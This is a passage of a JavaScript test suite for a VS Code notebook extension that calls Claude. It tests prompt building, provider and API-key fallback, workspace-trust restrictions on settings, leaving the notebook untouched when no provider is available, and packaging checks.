/* -------------------------------- prompts -------------------------------- */

const promptsModule = require(path.join('..', 'src', 'prompt.js'));
const providerModule = require(path.join('..', 'src', 'provider.js'));

const OPTS = {
  contextCells: 12,
  includeOutputs: true,
  systemPromptExtra: 'Beginner class: comment every line.',
  model: 'claude-opus-5',
  effort: 'medium',
  maxTokens: 8000,
};

test('generatePrompt carries the notebook context and the house style', () => {
  const notebook = newNotebook(['price = 499.99', 'print(price)']);
  const { system, user } = promptsModule.generatePrompt({
    notebook,
    index: 2,
    instruction: 'add 8% sales tax',
    opts: OPTS,
  });
  assert.match(system, /no markdown code fences|No markdown code fences/i);
  assert.match(system, /python/);
  assert.match(system, /Beginner class/);
  assert.match(user, /price = 499\.99/);
  assert.match(user, /inserted at position 2/);
  assert.match(user, /add 8% sales tax/);
});

test('generatePrompt honours the context window setting', () => {
  const notebook = newNotebook(['a = 1', 'b = 2', 'c = 3', 'd = 4']);
  const { user } = promptsModule.generatePrompt({
    notebook,
    index: 4,
    instruction: 'print them',
    opts: { ...OPTS, contextCells: 2 },
  });
  assert.ok(!user.includes('a = 1'), 'older cells should be dropped');
  assert.match(user, /2 earlier cells omitted/);
  assert.match(user, /d = 4/);
});

test('fixPrompt includes the failing cell and its traceback', () => {
  const notebook = newNotebook(['total = price + "tax"']);
  const cell = notebook.cellAt(0);
  cell.outputs = [
    {
      items: [
        {
          mime: 'application/vnd.code.notebook.error',
          data: Buffer.from(
            JSON.stringify({ name: 'TypeError', message: 'unsupported operand type(s)', stack: 'line 1' })
          ),
        },
      ],
    },
  ];
  const { user } = promptsModule.fixPrompt({ notebook, cell, opts: OPTS });
  assert.match(user, /total = price \+ "tax"/);
  assert.match(user, /TypeError: unsupported operand/);
  assert.match(user, /smallest\n?\s*change/);
});

test('explainPrompt asks for markdown, not code', () => {
  const notebook = newNotebook(['print("hi")']);
  const { system } = promptsModule.explainPrompt({ notebook, cell: notebook.cellAt(0), opts: OPTS });
  assert.match(system, /markdown cells/);
  assert.ok(!/runnable code/.test(system));
});

/* ------------------------------- providers ------------------------------- */

test('provider selection falls back to the claude CLI with no API key', async () => {
  const saved = [process.env.ANTHROPIC_API_KEY, process.env.ANTHROPIC_AUTH_TOKEN];
  delete process.env.ANTHROPIC_API_KEY;
  delete process.env.ANTHROPIC_AUTH_TOKEN;
  const secrets = { get: async () => undefined };
  try {
    await assert.rejects(
      () => providerModule.resolveProvider({ provider: 'api' }, secrets),
      (err) => err instanceof providerModule.ProviderError && err.action === 'setKey'
    );
    // process.execPath stands in for the CLI: it is guaranteed to exist and be
    // executable on any machine, so this no longer passes only where the author
    // happens to have Claude Code installed.
    const auto = await providerModule.resolveProvider(
      { provider: 'auto', claudePath: process.execPath },
      secrets
    );
    assert.strictEqual(auto.kind, 'cli', 'the local claude CLI should be used when no key is set');
    assert.strictEqual(auto.binary, process.execPath, 'claudePath wins over the search list');
    assert.match(auto.label, /Claude Code CLI/, 'the target carries a human-readable label');

    // The secret store is read once and cached, so swapping it out mid-test has
    // to announce itself - exactly as storing or clearing a key does at runtime.
    providerModule.invalidateSecretCache();
    const withKey = await providerModule.resolveProvider(
      { provider: 'auto' },
      { get: async () => 'sk-ant-test' }
    );
    assert.strictEqual(withKey.kind, 'api');
    assert.strictEqual(withKey.key, 'sk-ant-test');
    assert.match(withKey.label, /secret store/, 'the label names where the key came from');

    // ...and without that announcement the cached answer stands, which is the
    // whole point of the cache: one keychain round trip per change, not per cell.
    let reads = 0;
    const counting = {
      get: async () => {
        reads += 1;
        return 'sk-ant-test';
      },
    };
    providerModule.invalidateSecretCache();
    await providerModule.resolveProvider({ provider: 'auto' }, counting);
    await providerModule.resolveProvider({ provider: 'auto' }, counting);
    await providerModule.resolveProvider({ provider: 'auto' }, counting);
    assert.strictEqual(reads, 1, 'three commands must cost one secret-store read');
    providerModule.invalidateSecretCache();
  } finally {
    if (saved[0] !== undefined) process.env.ANTHROPIC_API_KEY = saved[0];
    if (saved[1] !== undefined) process.env.ANTHROPIC_AUTH_TOKEN = saved[1];
  }
});

/* ------------------------------- activation ------------------------------ */

test('activate registers exactly the commands the manifest contributes', async () => {
  const manifest = require(path.join('..', 'package.json'));
  const extension = require(path.join('..', 'extension.js'));
  vscode.__test.commands.clear();
  const context = {
    subscriptions: [],
    secrets: { get: async () => undefined, store: async () => undefined, delete: async () => undefined },
  };
  extension.activate(context);
  const registered = [...vscode.__test.commands.keys()].sort();
  const contributed = manifest.contributes.commands.map((c) => c.command).sort();
  assert.deepStrictEqual(registered, contributed);
  // `provider` is machine-overridable, so a cloned repository could force
  // claude-cli on an unsuspecting user; restricting it in untrusted folders is
  // what stops that.
  assert.ok(
    manifest.capabilities.untrustedWorkspaces.restrictedConfigurations.includes('aiNotebookLive.provider'),
    'the provider setting must be ignored in an untrusted workspace'
  );
  for (const binding of manifest.contributes.keybindings) {
    assert.ok(contributed.includes(binding.command), `keybinding for unknown ${binding.command}`);
  }
  for (const group of Object.values(manifest.contributes.menus)) {
    for (const item of group) {
      assert.ok(contributed.includes(item.command), `menu item for unknown ${item.command}`);
    }
  }
  assert.ok(context.subscriptions.length >= contributed.length);

  // Guardrails that used to be prose in a review instead of a test.
  const props = manifest.contributes.configuration.properties;
  for (const [key, spec] of Object.entries(props)) {
    if (/execution|autoRun|claudePath|bridge\.(autoStart|port)/.test(key)) {
      assert.strictEqual(
        spec.scope,
        'machine',
        `${key} decides execution or opens a socket, so a workspace must not set it`
      );
    }
  }
  assert.ok(manifest.capabilities.untrustedWorkspaces, 'workspace trust must be declared');
  assert.ok(
    manifest.capabilities.untrustedWorkspaces.restrictedConfigurations.includes(
      'aiNotebookLive.systemPromptExtra'
    ),
    'workspace-supplied prompt text must be restricted in an untrusted folder'
  );
  assert.ok(manifest.capabilities.virtualWorkspaces, 'virtual workspaces must be declared');
  const macDefaults = ['cmd+alt+f'];
  for (const binding of manifest.contributes.keybindings) {
    assert.ok(
      !macDefaults.includes(binding.mac),
      `${binding.mac} is a VS Code default on macOS; do not bind over it`
    );
  }

  await extension.deactivate();
});

test('a provider failure leaves the notebook byte-identical', async () => {
  // The headline of the preflight work. Previously reviseCell blanked the cell
  // and only THEN discovered there was no way to reach a model, so the single
  // likeliest first-run failure destroyed whatever the user had written.
  const extension = require(path.join('..', 'extension.js'));
  const notebook = newNotebook(['answer = 42  # took me all afternoon']);
  const before = notebook.getCells().map((c) => c.document.getText());

  const editor = { notebook, selection: { start: 0, end: 1 }, revealRange() {} };
  vscode.window.visibleNotebookEditors.push(editor);
  vscode.window.activeNotebookEditor = editor;

  // Force a provider that cannot possibly resolve: api mode with no key.
  vscode.__test.config.set('aiNotebookLive.provider', 'api');
  vscode.__test.inputs.push('make it handle bad input');
  vscode.__test.shown.length = 0;
  vscode.__test.commands.clear();
  vscode.__test.edits = 0;

  const context = {
    subscriptions: [],
    secrets: { get: async () => undefined, store: async () => undefined, delete: async () => undefined },
  };
  extension.activate(context);
  try {
    await vscode.__test.commands.get('aiNotebookLive.reviseCell')();
    // generate() would create a cell before streaming, so it is the command
    // that actually proves the preflight runs first.
    vscode.__test.inputs.push('plot a histogram');
    await vscode.__test.commands.get('aiNotebookLive.generate')();

    assert.deepStrictEqual(
      notebook.getCells().map((c) => c.document.getText()),
      before,
      'not one character of the notebook may change when no provider is available'
    );
    assert.strictEqual(notebook.cellCount, 1, 'and no stray cell is left behind');
    // The invariant the preflight actually buys: not that the damage is undone,
    // but that no edit is ever attempted. Undoing damage is phase 1's job.
    assert.strictEqual(
      vscode.__test.edits,
      0,
      'no workspace edit may be applied before the provider is known to work'
    );

    const errors = vscode.__test.shown.filter((e) => e.kind === 'error');
    assert.strictEqual(errors.length, 2, 'both commands tell the user what went wrong');
    assert.match(errors[0].message, /api key/i);
    assert.ok(
      errors[0].items.includes('Set API Key'),
      'and is offered something to do about it, not just a log'
    );
  } finally {
    await extension.deactivate();
    vscode.__test.config.clear();
    vscode.window.activeNotebookEditor = undefined;
    vscode.window.visibleNotebookEditors.length = 0;
    vscode.__test.inputs.length = 0;
    providerModule.invalidateSecretCache();
  }
});

test('a missing CLI offers a way to install it, not just a log', async () => {
  // provider.js threw action:'install' in two places and nothing ever handled
  // it, so the only button a stuck user got was "Show Log".
  const extension = require(path.join('..', 'extension.js'));
  const notebook = newNotebook(['x = 1']);
  const editor = { notebook, selection: { start: 0, end: 1 }, revealRange() {} };
  vscode.window.visibleNotebookEditors.push(editor);
  vscode.window.activeNotebookEditor = editor;

  vscode.__test.config.set('aiNotebookLive.provider', 'claude-cli');
  vscode.__test.config.set('aiNotebookLive.claudePath', path.join(BRIDGE_HOME, 'no-such-claude'));
  vscode.__test.inputs.push('do something');
  vscode.__test.shown.length = 0;
  vscode.__test.commands.clear();

  // The search list includes several $HOME locations, so hiding a real install
  // means moving HOME as well as PATH - otherwise this passes or fails
  // depending on whether the person running it has Claude Code installed.
  const saved = { PATH: process.env.PATH, HOME: process.env.HOME, EXEC: process.env.CLAUDE_CODE_EXECPATH };
  process.env.PATH = BRIDGE_HOME;
  process.env.HOME = BRIDGE_HOME;
  delete process.env.CLAUDE_CODE_EXECPATH;
  const context = {
    subscriptions: [],
    secrets: { get: async () => undefined, store: async () => undefined, delete: async () => undefined },
  };
  providerModule.invalidateCliCache();
  providerModule.invalidateSecretCache();
  extension.activate(context);
  try {
    await vscode.__test.commands.get('aiNotebookLive.reviseCell')();
    assert.strictEqual(notebook.cellAt(0).document.getText(), 'x = 1', 'cell untouched');
    const errors = vscode.__test.shown.filter((e) => e.kind === 'error');
    assert.strictEqual(errors.length, 1);
    assert.ok(errors[0].items.includes('Install Claude Code'), 'offers the install');
    assert.ok(errors[0].items.includes('Set the claude path'), 'offers the escape hatch');
  } finally {
    process.env.PATH = saved.PATH;
    process.env.HOME = saved.HOME;
    if (saved.EXEC !== undefined) process.env.CLAUDE_CODE_EXECPATH = saved.EXEC;
    await extension.deactivate();
    vscode.__test.config.clear();
    vscode.window.activeNotebookEditor = undefined;
    vscode.window.visibleNotebookEditors.length = 0;
    vscode.__test.inputs.length = 0;
    providerModule.invalidateCliCache();
    providerModule.invalidateSecretCache();
  }
});

test('the control panel shows the real policy and can change it', async () => {
  const extension = require(path.join('..', 'extension.js'));
  const notebook = newNotebook(['x = 1']);
  const editor = { notebook, selection: { start: 0, end: 1 }, revealRange() {} };
  vscode.window.visibleNotebookEditors.push(editor);
  vscode.window.activeNotebookEditor = editor;
  vscode.__test.config.clear();
  vscode.__test.config.set('aiNotebookLive.execution', 'never');
  vscode.__test.shown.length = 0;
  vscode.__test.commands.clear();

  const context = {
    subscriptions: [],
    secrets: { get: async () => undefined, store: async () => undefined, delete: async () => undefined },
  };
  extension.activate(context);
  try {
    // Open the panel and choose the "Run AI-generated code" row, then "Always".
    vscode.__test.picks.push('Run AI-generated code', 'Always');
    await vscode.__test.commands.get('aiNotebookLive.controlPanel')();

    const panel = vscode.__test.shown.find((e) => e.kind === 'quickpick');
    assert.ok(panel, 'the panel is a QuickPick');
    const labels = panel.items.map((i) => i.label).join(' | ');
    for (const expected of ['Run AI-generated code', 'Run code pushed in by agents', 'Agent bridge', 'Provider']) {
      assert.ok(labels.includes(expected), `panel is missing a row for ${expected}`);
    }
    // The row must report the setting as it actually is, not a guess.
    const runRow = panel.items.find((i) => i.label.includes('Run AI-generated code'));
    assert.strictEqual(runRow.description, 'Never');

    // And choosing a value writes it through to configuration.
    assert.strictEqual(
      vscode.__test.config.get('aiNotebookLive.execution'),
      'always',
      'the panel actually changes the setting'
    );
  } finally {
    await extension.deactivate();
    vscode.__test.config.clear();
    vscode.__test.picks.length = 0;
    vscode.window.activeNotebookEditor = undefined;
    vscode.window.visibleNotebookEditors.length = 0;
    providerModule.invalidateSecretCache();
  }
});

test('the packaged extension is small, complete and actually loadable', async () => {
  const manifest = require(path.join('..', 'package.json'));
  const root = path.join(__dirname, '..');

  // A broken bundle would otherwise ship green: the tests require the source
  // entry point, not the one the manifest declares.
  const main = path.join(root, manifest.main);
  assert.ok(fs.existsSync(main), `manifest.main (${manifest.main}) does not exist - run npm run build`);
  // And LOAD it. Checking the file exists is not checking it works: a bundle
  // that throws on require - an `external` becoming a hard dependency, say -
  // would have shipped with this test green and a confident name on it.
  const bundled = require(main);
  assert.strictEqual(typeof bundled.activate, 'function', 'the bundle must export activate');
  assert.strictEqual(typeof bundled.deactivate, 'function', 'and deactivate');

  // Everything the licences of the bundled packages require has to ship.
  for (const required of ['LICENSE', 'NOTICE', 'THIRD-PARTY-NOTICES.md', 'CHANGELOG.md', 'README.md', 'SECURITY.md']) {
    assert.ok(fs.existsSync(path.join(root, required)), `${required} is missing`);
  }

  // Every package the bundle pulled in must be named in the notices, or we are
  // redistributing it without its licence.
  const { packagesFrom } = require(path.join('..', 'scripts', 'licenses.js'));
  const metafilePath = path.join(root, 'dist', 'metafile.json');
  // Asserted, not guarded. `if (existsSync)` meant the whole notices check
  // silently did nothing when the build had not written a metafile - a guard
  // that turns a test off is not a test.
  assert.ok(fs.existsSync(metafilePath), 'the build must write dist/metafile.json');
  const notices = fs.readFileSync(path.join(root, 'THIRD-PARTY-NOTICES.md'), 'utf8');
  for (const pkg of packagesFrom(JSON.parse(fs.readFileSync(metafilePath, 'utf8')))) {
    assert.ok(notices.includes(pkg), `${pkg} is bundled but absent from THIRD-PARTY-NOTICES.md`);
  }

  // The old README claimed "18 tests" when there were 22. A number in prose
  // drifts; a number a test checks does not. The phrase itself is required:
  // wrapped in `if (claimed)`, deleting it from the README made this vacuous.
  const readme = fs.readFileSync(path.join(root, 'README.md'), 'utf8');
  const claimed = readme.match(/(\d+) tests/);
  assert.ok(claimed, 'the README must state how many tests there are');
  assert.strictEqual(
    Number(claimed[1]),
    tests.length,
    `README claims ${claimed[1]} tests but there are ${tests.length}`
  );
  // The install command uses a placeholder, so it cannot go stale; and if a
  // concrete version ever appears, it has to be this one.
  assert.match(readme, /ai-notebook-live-<version>\.vsix/, 'the install command must not pin a version');
  for (const m of readme.matchAll(/ai-notebook-live-(\d[\w.-]*)\.vsix/g)) {
    assert.strictEqual(m[1], manifest.version, `README names ${m[1]}, not ${manifest.version}`);
  }

  // The .vsix used to carry 2,399 files. Keep the win.
  const ignore = fs.readFileSync(path.join(root, '.vscodeignore'), 'utf8');
  assert.match(ignore, /^\*\*$/m, '.vscodeignore must be an allow-list, not a deny-list');
  assert.ok(!/^!src\//m.test(ignore), 'source must not ship alongside the bundle');
  assert.ok(!/^!node_modules/m.test(ignore), 'node_modules must not ship');
});

test('cancel and bridge commands are safe to call with nothing running', async () => {
  // Activates its own extension rather than borrowing the command registry a
  // test eighty lines up happened to leave behind - which made this fail in
  // isolation and in reverse order, and meant it asserted nothing on its own.
  const extension = require(path.join('..', 'extension.js'));
  newNotebook(['x = 1']);
  vscode.__test.commands.clear();
  const context = {
    subscriptions: [],
    secrets: { get: async () => undefined, store: async () => undefined, delete: async () => undefined },
  };
  extension.activate(context);
  try {
    // Cancel with no generation, and stop with no bridge: both are things a
    // user can do at any moment, and neither may throw.
    for (const id of ['aiNotebookLive.cancel', 'aiNotebookLive.stopBridge']) {
      const handler = vscode.__test.commands.get(id);
      assert.strictEqual(typeof handler, 'function', `${id} must be registered`);
      await handler();
      // Calling twice is the case that actually bites: the second stop used to
      // run against a bridge object that was already torn down.
      await handler();
    }
  } finally {
    await extension.deactivate();
  }
});

(async () => {
  // Two tests used to read state that an earlier test happened to leave behind,
  // and nothing could have told us: the suite only ever ran in one order. Set
  // AI_NOTEBOOK_TEST_ORDER=reverse, or shuffle:<seed>, to shake that out.
  const order = process.env.AI_NOTEBOOK_TEST_ORDER || '';
  if (order === 'reverse') {
    tests.reverse();
    process.stdout.write('  (test order reversed)\n');
  } else if (order.startsWith('shuffle')) {
    const seed = Number(order.split(':')[1]) || 1;
    const rnd = lcg(seed);
    for (let i = tests.length - 1; i > 0; i -= 1) {
      const j = Math.floor(rnd() * (i + 1));
      [tests[i], tests[j]] = [tests[j], tests[i]];
    }
    process.stdout.write(`  (test order shuffled, seed ${seed})\n`);
  }
  for (const [name, fn] of tests) {
    try {
      await fn();
      process.stdout.write(`  ok   ${name}\n`);
    } catch (err) {
      if (err instanceof Skip) {
        skipped += 1;
        process.stdout.write(`  skip ${name}\n       ${err.message}\n`);
        continue;
      }
      failures += 1;
      process.stdout.write(`  FAIL ${name}\n       ${err.message}\n`);
    }
  }
  process.stdout.write(
    `\n${tests.length - failures - skipped}/${tests.length} passed` +
      `${skipped ? `, ${skipped} skipped` : ''}\n`
  );
  process.exit(failures ? 1 : 0);
})();
